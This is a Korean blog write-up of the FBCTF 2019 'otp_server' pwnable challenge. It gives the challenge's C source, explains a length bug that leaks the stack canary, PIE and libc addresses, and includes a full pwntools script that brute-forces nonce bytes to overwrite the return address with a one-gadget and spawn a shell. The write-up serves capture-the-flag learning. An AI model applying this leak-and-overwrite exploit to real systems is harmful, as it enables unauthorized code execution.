---
title: FBCTF 2019 - otp_server
categories:
 - pwnable
tags: otp, pwn
---

```sh

Test our new OTP probocol: Randomly Over Padding
Spec: cipher((4 byte nonce) | message | (4 byte nonce))

1. Set Key
2. Encrypt message
3. Exit
>>> 

```

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

 FBCTF 2019에 있길래 풀어봄...
 09.10... 하기 너무싫다.
 
 리버싱 하기 너무 싫어서 깃허브에 같이 있던 소스코드 보면서 진행했다.. ㅎㅎ

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define MAX_MESSAGE 256
#define OTP_SIZE MAX_MESSAGE + 8 // message length + padding

FILE *urandom_fp;

char input_buffer[MAX_MESSAGE];
char otp_key[OTP_SIZE];

char encrypted_message_header[40] = "----- BEGIN ROP ENCRYPTED MESSAGE -----\n";
char encrypted_message_footer[39] = "\n----- END ROP ENCRYPTED MESSAGE -----\n";

void banner(void) {
  puts("Test our new OTP probocol: Randomly Over Padding");
  puts("Spec: cipher((4 byte nonce) | message | (4 byte nonce))\n");
  fflush(stdout);
}

// Sets up the randomness stream
void setup(void) {
  banner();
  urandom_fp = fopen("/dev/urandom", "r");

  if (!urandom_fp) {
    puts("/dev/urandom was not initialized - reach out to admin");
    exit(1);
  }
}

uint32_t gen_nonce(void) {
  uint32_t e = 0;

  if (!urandom_fp) {
    puts("/dev/urandom was not initialized - reach out to admin");
    exit(1);
  }

  fread(&e, sizeof(e), 1, urandom_fp);

  return e;
}

void get_key(void) {
  read(0, otp_key, sizeof(otp_key));
}

void get_user_message(void) {
  read(0, input_buffer, sizeof(input_buffer));
}

void output_encrypted_message(char *message, size_t length) {
  write(1, encrypted_message_header, sizeof(encrypted_message_header));
  write(1, message, length);
  write(1, encrypted_message_footer, sizeof(encrypted_message_footer));
}

void otp_cipher(char *buffer) {
  size_t i = 0;

  for (i = 0; i < OTP_SIZE; i++) {
    buffer[i] ^= otp_key[i];
  }
}

  void rop_protocol(char *message) {
    size_t length = 0;  
    uint32_t entropy = 0;
    
    entropy = gen_nonce();
  
    memcpy(message, &entropy, sizeof(entropy));
    length = snprintf(message + sizeof(entropy), OTP_SIZE - sizeof(entropy), "%s", input_buffer);
    memcpy(message + sizeof(entropy) + length, &entropy, sizeof(entropy));
  
    otp_cipher(message);
    output_encrypted_message(message, length + sizeof(entropy) + sizeof(entropy));
}

void encryption_menu(char *message) {
  char input[4];
  char option = 0;
  memset(input, 0, sizeof(input)); 

  while (1) {
    puts("1. Set Key");
    puts("2. Encrypt message");
    puts("3. Exit");
    printf(">>> ");

    fflush(stdout);

    read(0, input, 4);
    option = input[0] - '0';

    if (option == 1) {
      puts("Enter key:");
      fflush(stdout);

      get_key();
    } else if (option == 2) {
      puts("Enter message to encrypt:");
      fflush(stdout);

      get_user_message();
      rop_protocol(message);
    } else {
      break;
    }
  }
}


void cleanup(void) {
  if (urandom_fp) 
    fclose(urandom_fp);
}

int main(void) {
  char buffer[OTP_SIZE];
  setup();

  encryption_menu(buffer);

  cleanup();
}

```

## Vunlnerability

 `Encrypt message`에서 key와 input 값이 가상메모리상에서 인접해있어서 `snprintf`에 `%s`의 인자에서 같이 길이가 측정된다.
 
 이 때문에 암호화된 메세지를 `write`함수로 출력할때 `length`의 값이 비정상적으로 크게 넘어가기 때문에 `canary`, `pie`, `libc` leak이 동시에 가능해진다.(canary, sfp, ret 주소가 leak됨)
 
 추가적으로 취약점은 두번째 memcpy에서 발생하는데
 
 ```c
    memcpy(message, &entropy, sizeof(entropy));
    length = snprintf(message + sizeof(entropy), OTP_SIZE - sizeof(entropy), "%s", input_buffer);
    memcpy(message + sizeof(entropy) + length, &entropy, sizeof(entropy));
 ```
 
 공격자가 length의 값에 원하는 값을 넣을 수 있기 때문에 length를 잘 맞춰서 `main`의 ret의 4byte를 `onegadget`주소로 overwrite해주면 된다.
 
 
## Exploit

 문제는 overwrite되는 값이 `/dev/urandom`에서 가져오는 4byte라는 것인데, 처음에는 4byte 전체가 `onegadget`의 하위 4바이트와 같은 값이 나오면 break하게끔 진행했다.
 
 ㅋㅋㅋ; 익스가 끝나질 않는다... 상식적으로 0xfffffffff = 4,294,967,295 인데 보통 10억정도의 연산을 진행할때 1초가 걸린다고 들었다.
 
 하지만 이거는 연산도 연산이지만 binary와 지속적으로 send, recv를 해야되므로 훨씬 오래 걸리게된다. 하물며 로컬에서 이렇게 오래걸리는데 리모트면..? 상상하기 싫다.
 
 그래서 random_4byte의 상위 1byte가 onegadget의 하위 4바이트 중 상위 1바이트와 같은지 검사하고, key를 다시 생성해서 한칸씩 비교해서 overwrite를 진행했다.
 

## slv.py


```python
from pwn import *

p = process('./otp_server')

sla = lambda c, s : p.sendlineafter(c, str(s))
sa = lambda c,s : p.sendafter(c, str(s))

onegadget_offset = [0x4f365, 0x4f3c2, 0x10a45c]

def set_key(key):
    
    sa('>>> ' , 1)
    
    sa(':\n', key)
    
    return


def enc_message(message):
    
    sa('>>> ', 2)
    
    sa(':\n', message)
    
    return p.recvuntil('END ROP')

def exit():
    
    sa('>>> ', 3)
    
    return


def main():
    global script
    
    set_key('a'*0x100)
    #gdb.attach(p,script)
    
    
    
    leak = enc_message('a'*0x100).split('aaaaaaa\x00')[1]
    canary = u64(leak[:8])
    pie_base = u64(leak[8:16]) - 0xdd0
    libc_base = u64(leak[16:24]) - 0x21b97
    onegadget_addr = libc_base + onegadget_offset[1]
    
    log.info('canary : ' + hex(canary))
    log.info('pie_base : ' + hex(pie_base))
    log.info('libc_base : ' + hex(libc_base))
    log.info('onegadget_addr : ' + hex(onegadget_addr))
    
    
    set_key('b'*0x14 + '\x00'*(0x100-0x14))
    
    for i in range(4):
    
        while True:
            set_key('b'*(0x14 - i) + '\x00')
            leak = enc_message('a'*0x100).split('bbb\x00')[1]
            enc_val = u32(leak.split('\n----- END')[0][-4:])
             
            if (enc_val >> 24) & 0xff == (onegadget_addr >> (24-(i*8))) & 0xff:
                log.info('(onegadget_addr >> (24-(i*8)) & 0xff : ' + hex((onegadget_addr >> (24-(i*8))) & 0xff))
                log.info('(enc_val >> 24) & 0xff : ' + hex((enc_val >> 24) & 0xff))
                log.info('enc_val : ' + hex(enc_val))
                break
            
    exit()
    
    p.interactive()
    
    
    return


if __name__ == '__main__':
    main()
```


## 느낀 점

- RET overwrite 할때 canary 1byte씩 알아내는거랑 비슷했다.

## Reference

- [https://m.blog.naver.com/yjw_sz/221553081124](https://m.blog.naver.com/yjw_sz/221553081124)